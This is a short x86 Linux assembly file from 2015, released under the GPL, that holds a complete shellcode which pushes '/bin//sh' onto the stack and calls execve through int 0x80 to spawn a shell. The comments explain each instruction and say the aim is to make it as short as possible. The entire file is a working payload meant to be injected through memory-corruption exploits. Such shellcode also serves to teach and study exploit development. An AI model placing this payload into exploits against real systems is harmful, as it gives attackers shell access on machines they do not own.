    #
    # Execve /bin/sh Shellcode Via Push (Linux x86)
    #
    # Dying to be the shortest.
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 18 February 2015
    #
    # GPL
    #


    .global _start
_start:
    # char *const argv[]
    xorl %ecx, %ecx

    # 2 bytes, and both %eax and %edx were zeroed
    mull %ecx

    # __NR_execve 11
    movb $11, %al

    # for '\x00'
    pushl %ecx
    # 'h' 's' '/' '/'
    pushl $0x68732f2f
    # 'n' 'i' 'b' '/'
    pushl $0x6e69622f

    # const char *filename
    movl %esp, %ebx

    int $0x80
